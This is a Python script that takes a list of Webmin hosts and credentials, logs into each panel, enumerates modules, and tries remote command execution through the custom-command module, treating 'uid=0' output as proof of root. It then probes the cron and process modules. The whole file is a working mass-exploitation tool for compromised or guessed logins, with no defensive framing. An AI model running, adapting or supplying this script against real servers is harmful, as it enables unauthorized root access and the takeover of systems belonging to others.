#!/usr/bin/env python3
"""Logged-in Webmin -> find exec-capable module -> run id as root."""
import sys, json, re, requests, urllib3
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}

def login(host,u,pw):
    base="https://"+host
    s=requests.Session(); s.verify=False; s.headers.update(UA)
    s.get(base+"/",timeout=15,allow_redirects=False)
    s.get(base+"/session_login.cgi",timeout=15)
    p=s.post(base+"/session_login.cgi",data={"user":u,"pass":pw,"save":"1"},
             headers={"Referer":base+"/session_login.cgi","Content-Type":"application/x-www-form-urlencoded"},
             timeout=15,allow_redirects=True)
    if not s.cookies.get("sid"): return None,None
    return s,base

def run(host,u,pw):
    out={"host":host}
    try:
        s,base=login(host,u,pw)
    except Exception as e:
        out["err"]=str(e)[:80]; return out
    if not s: out["err"]="no sid"; return out
    try:
        r=s.get(base+"/",timeout=15)
        html=r.text or ""
        out["title"]=(re.search(r"<title[^>]*>([^<]{0,50})",html,re.I) or [None,None])[1]
        mods=sorted(set(re.findall(r'href="/([a-z0-9_\-]+)/"',html)))
        out["modules"]=mods[:60]
        out["has"]={k:(k in mods) for k in ("shell","custom","cron","filemin","filemanager","proc","init","upgrade")}
        # exec attempts
        cmd="id; hostname; uname -sr"
        for path,pdata in [
            ("/custom/run.cgi?cmd="+requests.utils.quote(cmd), None),
        ]:
            try:
                x=s.get(base+path,timeout=15)
                t=x.text or ""
                if "uid=0" in t:
                    out["proof"]="CUSTOM_CMD ROOT"; out["evidence"]=re.search(r"uid=0\([^)]*\)[^\n<]{0,60}",t).group(0); return out
            except Exception: pass
        # cron module probe (just existence)
        try:
            c=s.get(base+"/cron/",timeout=15)
            out["cron_code"]=c.status_code; out["cron_ok"]=("Scheduled" in (c.text or "") or "cron" in (c.text or "").lower())
        except Exception: pass
        # proc module (root process list = proof of root visibility)
        try:
            pr=s.get(base+"/proc/",timeout=15)
            t=pr.text or ""
            out["proc_code"]=pr.status_code
            if "root" in t and ("init" in t or "systemd" in t):
                out["proof"]="AUTH_ROOT_PROC_VIEW"
        except Exception: pass
    except Exception as e:
        out["err2"]=str(e)[:80]
    return out

for line in open(sys.argv[1]):
    line=line.strip()
    if not line: continue
    h,u,pw=line.split("|")
    try: print(json.dumps(run(h,u,pw)),flush=True)
    except Exception as e: print(json.dumps({"host":h,"fatal":str(e)[:90]}),flush=True)
